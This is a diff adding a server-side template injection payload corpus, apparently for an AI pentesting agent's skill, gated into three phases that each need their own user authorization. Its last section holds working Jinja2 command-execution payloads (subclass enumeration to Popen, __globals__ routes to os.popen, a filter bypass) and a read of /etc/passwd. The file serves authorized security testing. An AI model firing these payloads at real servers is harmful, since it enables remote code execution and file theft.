@@ -1,0 +1,108 @@
+# SSTI payload corpus for skills/ssti/SKILL.md — one file, three phases.
+#
+# This file has three sections, separated by banners below. They carry
+# different authorization requirements even though they're in one file:
+#
+#   - Phase 1 (top section): no checkpoint required. Arithmetic and
+#     parse-error probes only, across all engines. Safe to run first.
+#
+#   - Phase 2 section: requires the scope checkpoint (ask_user) that
+#     gates entering Phase 2 at all. Introspection only, no
+#     gadget-walking, no exec.
+#
+#   - Phase 3 section: requires a separate, additional ask_user
+#     authorization, obtained after SSTI is already confirmed at SSTI-2.
+#     Reading further into this file for an earlier phase does not grant permission
+#     to use a later section. Per SKILL.md, Phase 3 never
+#     runs automatically just because its payloads happen to be in the
+#     same file you already read.
+#
+# Only use the section that matches the phase you are currently
+# authorized for. Do not skip ahead because a later section is visible
+# in the same file.
+
+# ============================================================================
+# ========================= PHASE 1 — FINGERPRINT ===========================
+# ============================================================================
+# Arithmetic and parse-error probes only, across engines. None of these
+# perform introspection, file access, or command execution. Safe to run
+# without the scope checkpoint. Inject each probe individually, observe
+# what renders.
+
+{{7*7}}                    # Jinja2, Twig, Liquid, Nunjucks: render 49
+{{7*'7'}}                  # Jinja2: 7777777   |  Twig: 49   (most reliable J2-vs-Twig differentiator)
+${7*7}                     # Velocity, Freemarker, Mako, Thymeleaf (some), JSP EL: render 49
+#{7*7}                     # Pug (Node), Ruby string interpolation in some contexts: 49
+*{7*7}                     # Smarty, Thymeleaf-Spring (older): 49
+<%= 7*7 %>                 # ERB (Ruby), EJS (Node): 49
+<%=7*7%>                   # same as above, no spaces
+[[${7*7}]]                 # Thymeleaf: 49
+%{7*7}                     # Struts2 OGNL: 49 (often only in specific contexts)
+{{= 7*7 }}                 # Underscore / Lodash templates: 49
+{{7*7}}-{{8*8}}            # combined probe — easier to spot in noisy output
+${{<%[%'"}}%\.              # polyglot break — engines that can't parse this throw a distinctive error
+#set($x=7*7)$x              # Velocity: renders 49 — arithmetic-only Velocity/Freemarker discriminator (Freemarker chokes on <#assign> outside a template block instead)
+
+# ============================================================================
+# ========================= PHASE 2 — VALIDATION ============================
+# ============================================================================
+# Requires the scope checkpoint (ask_user) before use. Do not run
+# anything in this section until Phase 1 has confirmed template
+# evaluation and authorization has been confirmed via ask_user for
+# probing beyond arithmetic.
+#
+# Type information only. No subclass enumeration, no attribute-proxy
+# route to globals, and no exec. Confirms evaluation beyond arithmetic
+# (SSTI-2), nothing more.
+
+{{ ''.__class__ }}         # Jinja2: leaks <class 'str'> — confirms evaluation beyond arithmetic, type info only, no gadget walking
+${"foo".getClass()}        # Velocity/Freemarker: leaks Java class name (class java.lang.String) — introspection, combine with the Phase 1 parse-behavior result to disambiguate the two engines
+
+# ============================================================================
+# ============ everything below this line is PHASE 3 — IMPACT ==============
+# ============================================================================
+# Do not use without explicit ask_user authorization obtained after SSTI
+# has already been confirmed at SSTI-2 above. Merely having read this far
+# into the file is not authorization to run anything below this banner.
+#
+# Retrieve only the minimum artifact needed to demonstrate impact (e.g.
+# the output of a harmless command like `id`, or a single file explicitly
+# relevant to the finding). Do not chain a result from one payload below
+# into another "just to be thorough" — e.g. do not take a disclosed
+# secret and use it to forge a session; that is a separate,
+# further-authorized step.
+
+# --- Jinja2: command execution via subclass enumeration ----------------
+# Step 1: enumerate loaded classes to find the index N where the class
+# name is <class 'subprocess.Popen'> (commonly in the 200-400 range).
+# This enumeration step is itself Phase 3 — do not run it under Phase 2
+# authorization, since it walks toward an exec-capable gadget.
+{{ ''.__class__.__mro__[1].__subclasses__() }}
+
+# Step 2: invoke Popen at the discovered index N with a harmless command
+# (`id`), which is what makes the result SSTI-3.
+{{ ''.__class__.__mro__[1].__subclasses__()[N]('id', shell=True, stdout=-1).communicate() }}
+
+# --- Jinja2: __globals__ attribute-proxy route (works even when __ is blacklisted or when subclass enumeration is filtered) ---
+{{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('id')|attr('read')()}}
+
+# --- Jinja2: __globals__ route via unfiltered Jinja2/Flask globals -----
+{{ url_for.__globals__.os.popen('id').read() }}
+{{ lipsum.__globals__.os.popen('id').read() }}
+{{ cycler.__init__.__globals__.os.popen('id').read() }}
+
+# --- Jinja2: direct file read (use only for a single file explicitly relevant to the finding — not for browsing arbitrary files) ---
+{{ get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read() }}
+
+# --- Jinja2: filter-bypass loop (use only if direct __class__ access is blocked) ---
+{% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{% endif %}{% endfor %}
+
+# Note: broad context/environment dumps (the Flask config object, its
+# items, the template self-reference, or the full request environment)
+# are intentionally not included here. They are not "minimal impact" —
+# they disclose far more than needed to prove a finding (e.g. Flask
+# SECRET_KEY) and are excluded from this default corpus even under
+# Phase 3 authorization. If a specific, narrowly-scoped config value is
+# genuinely needed to demonstrate impact, ask_user for that specific,
+# additional authorization rather than reaching for a full dump by
+# default.
